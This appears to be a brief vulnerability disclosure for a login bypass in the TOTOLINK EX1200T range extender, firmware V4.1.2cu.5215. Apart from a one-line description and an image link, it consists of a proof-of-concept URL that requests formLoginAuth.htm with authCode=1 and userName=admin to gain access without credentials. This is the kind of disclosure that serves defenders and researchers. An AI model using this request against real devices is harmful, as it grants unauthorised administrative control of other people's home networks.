# TOTOLINK EX1200T LOGIN BYPASS

## Vulnerability Description

PRODUCT: TOTOLINK EX1200T V4.1.2cu.5215 (latest version)

An attacker can bypass login by sending a specific request.

![image-20211021180828521](https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211021180828521.png)

## PoC

```
http://[ip]/formLoginAuth.htm?authCode=1&userName=admin&goURL=home.asp&action=login
```



